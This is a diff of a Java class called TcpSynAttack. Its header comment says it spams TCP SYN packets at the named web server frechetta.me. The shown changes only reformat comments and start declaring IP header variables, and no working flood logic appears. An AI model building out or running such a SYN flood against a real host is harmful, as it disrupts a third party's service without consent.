@@ -1,8 +1,8 @@
 /** 
-* <b> TCP Attack </b>
-* @author Edgar Delgado
-* This connects to frechetta.me web server and spams TCP SYN packets
-*/
+ * <b> TCP Attack </b>
+ * @author Edgar Delgado
+ * This connects to frechetta.me web server and spams TCP SYN packets.
+ */
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
@@ -13,17 +13,17 @@ import java.net.Socket;
 import java.nio.ByteBuffer;
 
 public class TcpSynAttack {
-
-  // Main method  
+  /**
+  * Main method.
+  */
   public static void main(String[] args) {
     boolean timeToExit = false; 
 
-    /* Declaring all variables that are going to get send via a packet
-    to send a packet with different types of variables we need to 
-    convert everything into bytes */
+
 
     String characters = "!BBHHHBBH4s4s";
-    //converting the string called characters into bytes
+
+    //converting the string called characters into bytes.
     byte[] charactersBytes = characters.getBytes(); 
     int ipIhl = 5;
     int ipVer = 4;
